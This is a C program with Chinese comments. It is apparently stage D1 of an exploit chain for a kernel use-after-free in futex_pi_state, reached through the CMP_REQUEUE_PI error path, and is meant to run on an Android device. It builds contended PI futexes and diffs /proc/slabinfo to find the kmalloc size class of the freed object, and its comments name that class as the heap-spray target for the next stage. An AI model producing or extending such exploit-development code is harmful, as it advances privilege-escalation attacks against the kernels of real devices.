/*
 * g3d_piufa.c — futex_pi_state UAF 线 · D1：尺寸类标定（安全，无悬挂状态）
 *
 * 背景（交接文档 §21.17）：
 *   `CMP_REQUEUE_PI` 返回 -EDEADLK 时，错误路径 put_pi_state() 归零
 *   ⇒ free_pi_state() ⇒ rt_mutex_proxy_unlock() + kfree()，销毁目标 futex 的
 *   pi_state（内核 owner 变 NULL，用户态字值不变）。悬垂 waiter->lock 指向
 *   这块已释放对象 ⇒ 堆 UAF。
 *
 * D1 目标（本程序）：
 *   1) 标定 `struct futex_pi_state` 的真实尺寸类：制造 N 个**有竞争**的 PI futex
 *      （每对 = 持有者 + 一个阻塞 waiter），每对必分配 1 个 pi_state；
 *      对比 /proc/slabinfo 的 kmalloc-64/96/128 active_objs 前后差值。
 *   2) 回收后再测一次，确认差值回落（验证测量方法本身有效）。
 *   3) 留出 `u` 模式给 D2/D3 复用（本版不启用）。
 *
 * 判据：若 kmalloc-96 的 active 增加量 ≈ N，则 pi_state 尺寸类为 kmalloc-96
 *       （88 B → 96 的 slab），D2 的喷堆目标即该类。
 *
 * 用法（设备端）：
 *   /data/local/tmp/g3d_piufa s [N]     # 默认 N=32
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g3d.log"
#define FUTEX_LOCK_PI       6
#define FUTEX_UNLOCK_PI     7
#define FUTEX_PRIVATE_FLAG  128
#define MAXN                128

static int logfd = -1;
static double t0;

struct pair {
	uint32_t word;
	volatile int held;
	volatile int waiter_in;
	volatile int go_release;
	volatile int waiter_done;
};

static struct pair *P;
static int N = 32;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[400], line[480];
	va_list ap;
	int n;
	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%9.1fms] %s\n", now_ms() - t0, buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
	if (logfd >= 0) fsync(logfd);
}

static long lock_pi_to(uint32_t *u, int ms)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_sec += ms / 1000;
	ts.tv_nsec += (long)(ms % 1000) * 1000000L;
	while (ts.tv_nsec >= 1000000000L) { ts.tv_sec += 1; ts.tv_nsec -= 1000000000L; }
	return syscall(SYS_futex, u, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, &ts, NULL, 0);
}

static long unlock_pi(uint32_t *u)
{
	return syscall(SYS_futex, u, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
}

/* 读 /proc/slabinfo 中某个 cache 的 active_objs */
static long slab_active(const char *name, long *num_objs, long *objsize)
{
	FILE *f = fopen("/proc/slabinfo", "r");
	char line[512], nm[64];
	long act, num, osz, ops, pps;
	if (!f) return -1;
	while (fgets(line, sizeof(line), f)) {
		if (sscanf(line, "%63s %ld %ld %ld %ld %ld", nm, &act, &num,
			   &osz, &ops, &pps) == 6) {
			if (strcmp(nm, name) == 0) {
				fclose(f);
				if (num_objs) *num_objs = num;
				if (objsize) *objsize = osz;
				return act;
			}
		}
	}
	fclose(f);
	return -1;
}

static void snap(const char *tag)
{
	const char *caches[] = { "kmalloc-64", "kmalloc-96", "kmalloc-128" };
	int i;
	for (i = 0; i < 3; i++) {
		long num = 0, osz = 0;
		long act = slab_active(caches[i], &num, &osz);
		if (act < 0)
			lg("slab %-12s : <不可读>  [%s]", caches[i], tag);
		else
			lg("slab %-12s : active=%-7ld num=%-7ld objsize=%ld  [%s]",
			   caches[i], act, num, osz, tag);
	}
}

static void *th_hold(void *arg)
{
	struct pair *p = arg;
	if (lock_pi_to(&p->word, 5000) != 0) {
		lg("hold: LOCK_PI 失败 errno=%d", errno);
		p->held = -1;
		return NULL;
	}
	p->held = 1;
	while (!p->go_release)
		__asm__ __volatile__("" ::: "memory");
	(void)unlock_pi(&p->word);
	return NULL;
}

static void *th_wait(void *arg)
{
	struct pair *p = arg;
	while (p->held == 0)
		__asm__ __volatile__("" ::: "memory");
	p->waiter_in = 1;
	/* 阻塞：触发该 futex 的 pi_state 分配 */
	if (lock_pi_to(&p->word, 5000) != 0) {
		lg("wait: LOCK_PI 返回 errno=%d（预期交接成功）", errno);
		p->waiter_done = -1;
		return NULL;
	}
	/* 交接后成为 owner，释放并退出 */
	(void)unlock_pi(&p->word);
	p->waiter_done = 1;
	return NULL;
}

int main(int argc, char **argv)
{
	pthread_t *th = NULL, *tw = NULL;
	int i, ok = 0;
	char mode = (argc > 1) ? argv[1][0] : 's';

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	t0 = now_ms();
	if (argc > 2) {
		N = atoi(argv[2]);
		if (N < 1) N = 1;
		if (N > MAXN) N = MAXN;
	}
	lg("===== G3D D1 start pid=%d mode=%c N=%d =====", getpid(), mode, N);

	P = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (P == MAP_FAILED) { lg("mmap FAIL"); return 1; }
	memset(P, 0, 4096);

	th = calloc(N, sizeof(pthread_t));
	tw = calloc(N, sizeof(pthread_t));

	snap("baseline");

	for (i = 0; i < N; i++) {
		if (pthread_create(&th[i], NULL, th_hold, &P[i]) != 0 ||
		    pthread_create(&tw[i], NULL, th_wait, &P[i]) != 0) {
			lg("线程创建失败 i=%d", i);
			break;
		}
	}
	/* 等待全部就绪（持有 + waiter 已排队） */
	{
		int spin = 0;
		while (spin < 400) {
			int c = 0;
			for (i = 0; i < N; i++)
				if (P[i].held == 1 && P[i].waiter_in) c++;
			if (c == N) break;
			usleep(5000);
			spin++;
		}
		for (i = 0; i < N; i++)
			if (P[i].held == 1 && P[i].waiter_in) ok++;
	}
	usleep(150000);
	lg("已建立 %d/%d 个竞争 PI futex（每个应分配 1 个 futex_pi_state）", ok, N);
	snap("after-alloc");

	/* 回收 */
	for (i = 0; i < N; i++)
		P[i].go_release = 1;
	for (i = 0; i < N; i++) {
		pthread_join(th[i], NULL);
		pthread_join(tw[i], NULL);
	}
	usleep(200000);
	lg("已回收全部竞争 futex");
	snap("after-free");

	lg("---- 判读 ----");
	lg("若 after-alloc 相对 baseline 在 kmalloc-96 上增加 ≈ %d，且 after-free 回落，", N);
	lg("则 futex_pi_state 的尺寸类 = kmalloc-96（88 B → 96），D2 喷堆目标即该类。");
	lg("结束");
	if (logfd >= 0) fsync(logfd);
	return 0;
}
